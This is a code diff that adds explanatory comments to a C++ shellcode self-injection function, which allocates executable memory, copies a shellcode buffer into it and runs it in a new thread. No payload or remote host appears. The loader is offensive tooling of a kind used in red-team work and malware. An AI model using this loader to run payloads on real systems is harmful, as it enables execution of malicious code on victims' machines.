@@ -12,6 +12,7 @@ namespace ShellcodeExecution
 
     int ShellcodeSelfInjector::SelfInjection()
     {
+        // Allocate memory for the shellcode
         LPVOID allocatedMemory = VirtualAlloc(NULL, this->_shellcodeSize, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
 
         if (allocatedMemory == NULL)
@@ -22,10 +23,12 @@ namespace ShellcodeExecution
 
         std::cout << "[+] Memory allocated at address: " << allocatedMemory << std::endl;
 
+        // Copy the shellcode to the allocated memory
         RtlCopyMemory(allocatedMemory, this->_shellcode, this->_shellcodeSize);
 
         std::cout << "[+] Shellcode written to allocated memory" << std::endl;
 
+        // Create a thread to execute the shellcode
         HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)allocatedMemory, NULL, 0, NULL);
 
         if (hThread == NULL) {
@@ -35,6 +38,7 @@ namespace ShellcodeExecution
 
         std::cout << "[+] Thread created" << std::endl;
 
+        // Wait for the thread to finish
         WaitForSingleObject(hThread, INFINITE);
 
         std::cout << "[*] Closing thread handle..." << std::endl;
@@ -43,6 +47,7 @@ namespace ShellcodeExecution
 
         std::cout << "[*] Freeing memory..." << std::endl;
 
+        // Free the allocated memory
         VirtualFree(allocatedMemory, 0, MEM_RELEASE);
 
         std::cout << "[*] Exiting" << std::endl;
